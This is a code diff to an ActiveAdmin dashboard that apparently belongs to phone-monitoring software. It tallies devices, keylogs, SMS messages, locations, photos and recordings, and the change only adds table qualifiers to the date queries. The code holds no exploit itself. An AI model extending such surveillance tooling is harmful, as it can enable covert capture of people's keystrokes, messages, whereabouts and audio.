@@ -43,23 +43,23 @@ ActiveAdmin.register_page "Dashboard" do
 
         stats_data = [
           ["📱", devices.count, total_devices, "Devices", "blue",
-            devices.where("updated_at >= ?", today_start).count,
-            devices.where(updated_at: yesterday_start..yesterday_end).count],
+            devices.where("smartphones.updated_at >= ?", today_start).count,
+            devices.where(smartphones: { updated_at: yesterday_start..yesterday_end }).count],
           ["⌨️", total_keylogs, nil, "Keylogs", "purple",
-            (Keylog.where("created_at >= ?", today_start).count rescue 0),
-            (Keylog.where(created_at: yesterday_start..yesterday_end).count rescue 0)],
+            (Keylog.where("keylogs.created_at >= ?", today_start).count rescue 0),
+            (Keylog.where(keylogs: { created_at: yesterday_start..yesterday_end }).count rescue 0)],
           ["💬", total_sms, nil, "SMS", "cyan",
-            SmsMessage.where("created_at >= ?", today_start).count,
-            SmsMessage.where(created_at: yesterday_start..yesterday_end).count],
+            SmsMessage.where("sms_messages.created_at >= ?", today_start).count,
+            SmsMessage.where(sms_messages: { created_at: yesterday_start..yesterday_end }).count],
           ["📍", total_locations, nil, "Locations", "green",
-            GeoLocation.where("created_at >= ?", today_start).count,
-            GeoLocation.where(created_at: yesterday_start..yesterday_end).count],
+            GeoLocation.where("geo_locations.created_at >= ?", today_start).count,
+            GeoLocation.where(geo_locations: { created_at: yesterday_start..yesterday_end }).count],
           ["📷", total_photos, nil, "Photos", "amber",
-            Picture.where("created_at >= ?", today_start).count,
-            Picture.where(created_at: yesterday_start..yesterday_end).count],
+            Picture.where("pictures.created_at >= ?", today_start).count,
+            Picture.where(pictures: { created_at: yesterday_start..yesterday_end }).count],
           ["🎵", total_recordings, nil, "Recordings", "red",
-            Recording.where("created_at >= ?", today_start).count,
-            Recording.where(created_at: yesterday_start..yesterday_end).count]
+            Recording.where("recordings.created_at >= ?", today_start).count,
+            Recording.where(recordings: { created_at: yesterday_start..yesterday_end }).count]
         ]
 
         stats_data.each_with_index do |(icon, val, secondary, label, color, today_count, yesterday_count), idx|
